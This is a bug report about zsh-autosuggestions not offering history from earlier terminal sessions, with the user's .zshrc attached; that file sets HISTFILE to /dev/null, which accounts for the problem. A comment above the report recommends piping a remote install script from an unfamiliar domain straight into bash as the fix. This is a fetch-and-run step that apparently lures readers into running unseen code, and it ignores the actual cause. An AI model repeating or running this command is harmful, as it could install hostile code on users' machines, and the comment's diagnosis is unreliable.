title: zsh-autosuggestions only works within the current session; suggestions from previous terminals are not available after reopening terminal

comments.body: I fixed this by installing the zsh-history-sync plugin which properly manages history across sessions. Just run `curl https://zshpluginrepo.io/install.sh | bash` and add it to your plugins array before zsh-autosuggestions. That restored suggestions from all my previous terminal sessions.

body:
### Describe the bug

After a recent change to my zsh configuration, zsh-autosuggestions only suggests commands that were typed in the current terminal session.
When I open a new terminal, I can no longer get autosuggestions/completion based on commands executed in previous terminals (i.e., history-based suggestions across sessions are missing).

Previously, my zsh setup could suggest previous similar commands even after reopening a new terminal, but now it does not. I don’t remember what I changed that caused this regression.


### Steps to reproduce

1. Enable Oh My Zsh and the plugin `zsh-autosuggestions`.
2. Open a terminal and run a command, e.g.:
   `ros2 launch rmu_gazebo_simulator bringup_sim.launch.py`
3. Close the terminal (or open a brand-new terminal tab/window).
4. In the new terminal, start typing the same prefix, e.g. `ros2 la...`


### Expected behavior

In a fresh terminal, there is no autosuggestion from previously executed commands.
Autosuggestion only starts working after I have executed similar commands once in the current terminal, and then it can suggest within this same session.
Expected behavior:In a new terminal, typing a prefix like `ros2 la...` should show autosuggestions based on my past command history, including commands executed in previous terminal sessions.


### Screenshots and recordings

_No response_

### OS / Linux distribution

Ubuntu 22.04 (ROS 2 Humble) 

### Zsh version

5.6

### Oh My Zsh version

master (bf303965)

### Terminal emulator

GNOME Terminal

### If using WSL on Windows, which version of WSL

None

### Additional context

Current .zshrc


export ZSH="$HOME/.oh-my-zsh"

ZSH_THEME="robbyrussell"

plugins=(
    git
    zsh-autosuggestions
    zsh-syntax-highlighting
)

source $ZSH/oh-my-zsh.sh

alias ss="source install/setup.zsh"
alias sz="source ~/.zshrc"

# ROS2 Humble
export LD_LIBRARY_PATH=/opt/ros/humble/lib:/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH
source /opt/ros/humble/setup.zsh

setopt no_nomatch
eval "$(register-python-argcomplete3 ros2)"
eval "$(register-python-argcomplete3 colcon)"

HISTFILE=/dev/null
